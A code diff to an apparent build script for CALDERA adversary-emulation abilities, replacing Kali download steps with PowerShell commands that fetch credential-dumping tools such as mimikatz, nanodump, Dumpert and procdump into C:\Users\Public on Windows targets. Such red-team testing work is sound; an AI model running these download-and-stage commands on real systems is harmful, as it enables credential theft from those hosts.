@@ -56,36 +56,27 @@ function build() {
   }
 }
 
-const PAYLOAD_DIR = "$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads"
-
 const PAYLOAD_DOWNLOADS = {
   "procdump.exe": {
-    dest: `${PAYLOAD_DIR}/procdump.exe`,
-    kali_steps: `mkdir -p ${PAYLOAD_DIR} && \\\nwget -q "https://download.sysinternals.com/files/Procdump.zip" -O /tmp/Procdump.zip && \\\nunzip -o /tmp/Procdump.zip -d /tmp/Procdump && \\\ncp /tmp/Procdump/procdump64.exe ${PAYLOAD_DIR}/procdump.exe && \\\nrm -rf /tmp/Procdump.zip /tmp/Procdump && \\\nsystemctl restart caldera`,
-    win_steps: "",
+    win_dest: "C:\\Users\\Public\\procdump.exe",
+    win_steps: `Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/Procdump.zip' -OutFile 'C:\\Users\\Public\\payload.zip'; Expand-Archive -Path 'C:\\Users\\Public\\payload.zip' -DestinationPath 'C:\\Users\\Public\\payload_extract' -Force; Copy-Item 'C:\\Users\\Public\\payload_extract\\procdump64.exe' 'C:\\Users\\Public\\procdump.exe' -Force; Remove-Item 'C:\\Users\\Public\\payload.zip' -Force; Remove-Item 'C:\\Users\\Public\\payload_extract' -Recurse -Force`,
   },
   "Outflank-Dumpert.exe": {
-    dest: `${PAYLOAD_DIR}/Outflank-Dumpert.exe`,
-    kali_steps: `mkdir -p ${PAYLOAD_DIR} && \\\nwget -q "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -O ${PAYLOAD_DIR}/Outflank-Dumpert.exe && \\\nsystemctl restart caldera`,
-    win_steps: "",
+    win_dest: "C:\\Users\\Public\\Outflank-Dumpert.exe",
+    win_steps: `Invoke-WebRequest -Uri 'https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe' -OutFile 'C:\\Users\\Public\\Outflank-Dumpert.exe'`,
   },
   "nanodump.x64.exe": {
-    dest: `${PAYLOAD_DIR}/nanodump.x64.exe`,
-    kali_steps: `mkdir -p ${PAYLOAD_DIR} && \\\nwget -q "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe" -O ${PAYLOAD_DIR}/nanodump.x64.exe && \\\nsystemctl restart caldera`,
-    win_steps: "",
+    win_dest: "C:\\Users\\Public\\nanodump.x64.exe",
+    win_steps: `Invoke-WebRequest -Uri 'https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe' -OutFile 'C:\\Users\\Public\\nanodump.x64.exe'`,
   },
   "mimikatz.exe": {
-    dest: `${PAYLOAD_DIR}/x64/mimikatz.exe`,
-    kali_steps: `mkdir -p ${PAYLOAD_DIR}/x64 && \\\nwget -q "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" -O /tmp/mimikatz.zip && \\\nunzip -o /tmp/mimikatz.zip -d /tmp/mimikatz && \\\ncp /tmp/mimikatz/x64/mimikatz.exe ${PAYLOAD_DIR}/x64/mimikatz.exe && \\\nrm -rf /tmp/mimikatz.zip /tmp/mimikatz && \\\nsystemctl restart caldera`,
-    win_steps: "",
+    win_dest: "C:\\Users\\Public\\x64\\mimikatz.exe",
+    win_steps: `New-Item -ItemType Directory -Force -Path 'C:\\Users\\Public\\x64'; Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip' -OutFile 'C:\\Users\\Public\\payload.zip'; Expand-Archive -Path 'C:\\Users\\Public\\payload.zip' -DestinationPath 'C:\\Users\\Public\\payload_extract' -Force; Copy-Item 'C:\\Users\\Public\\payload_extract\\x64\\mimikatz.exe' 'C:\\Users\\Public\\x64\\mimikatz.exe' -Force; Remove-Item 'C:\\Users\\Public\\payload.zip' -Force; Remove-Item 'C:\\Users\\Public\\payload_extract' -Recurse -Force`,
   },
   "pypykatz": {
-    dest: `${PAYLOAD_DIR}/pypykatz`,
-    kali_steps: `pip3 install pypykatz && \
-cp -r $(python3 -c "import pypykatz, os; print(os.path.dirname(pypykatz.__file__))") ${PAYLOAD_DIR}/pypykatz && \
-systemctl restart caldera`,
-    win_steps: `invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "ExternalPayloads\\python_setup.exe"
-Start-Process -FilePath "ExternalPayloads\\python_setup.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait`,
+    win_dest: null,
+    replace_with: "pypykatz",
+    win_steps: `Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe' -OutFile 'C:\\Users\\Public\\python_setup.exe'; Start-Process -FilePath 'C:\\Users\\Public\\python_setup.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1 Include_test=0' -Wait; Remove-Item 'C:\\Users\\Public\\python_setup.exe' -Force; $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User'); pip install pypykatz`,
   },
 }
 
@@ -156,15 +147,22 @@ function enrichPayloads(ability) {
   const info = PAYLOAD_DOWNLOADS[filename] || PAYLOAD_DOWNLOADS[Object.keys(PAYLOAD_DOWNLOADS).find(k => filename.includes(k))]
   if (!info) return ability
 
-  const kaliSteps = info.kali_steps
-    ? `if [ -f "${info.dest}" ]; then echo "ALREADY_PRESENT: ${info.dest}"; else ${info.kali_steps}; fi`
-    : ""
-  const winSteps = info.win_steps
-    ? `if (Test-Path "${info.dest}") { Write-Host "ALREADY_PRESENT: ${info.dest}" } else { ${info.win_steps} }`
-    : ""
+  const winSteps = info.win_dest
+    ? `if (Test-Path "${info.win_dest}") { Write-Host "ALREADY_PRESENT: ${info.win_dest}" } else { ${info.win_steps} }`
+    : info.win_steps
+
+  const escapedFilename = filename.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
+  const re = new RegExp(`"?PathToAtomicsFolder[^"\\s]*${escapedFilename}"?`)
+  const replacement = info.replace_with || `"${info.win_dest}"`
+
+  const executors = ability.executors.map(e => ({
+    ...e,
+    command: e.command.replace(re, replacement),
+  }))
+
   return {
     ...ability,
-    kali_prereq: kaliSteps,
+    executors,
     win_prereq: winSteps,
   }
 }
@@ -180,7 +178,6 @@ function enrichBuiltinToolPrereqs(ability) {
 
     return {
       ...ability,
-      kali_prereq: ability.kali_prereq || "",
       win_prereq: `if (Test-Path "${prereq.win_check_path}") { Write-Host "ALREADY_PRESENT: ${prereq.win_check_path}" } else { ${prereq.win_steps} }`,
     }
   }
@@ -200,7 +197,6 @@ function enrichCustom(ability) {
     ...ability,
     executors,
     win_prereq: override.win_prereq || ability.win_prereq || "",
-    kali_prereq: ability.kali_prereq || "",
   }
 }
 
@@ -211,7 +207,6 @@ function strip(ability) {
     name: ability.name,
     description: ability.description ?? "",
     command: executor.command ?? "",
-    kali_prereq: (ability.kali_prereq ?? "").replace(/\bsystemctl\b/g, "sudo systemctl"),
     win_prereq: ability.win_prereq ?? "",
   }
 }
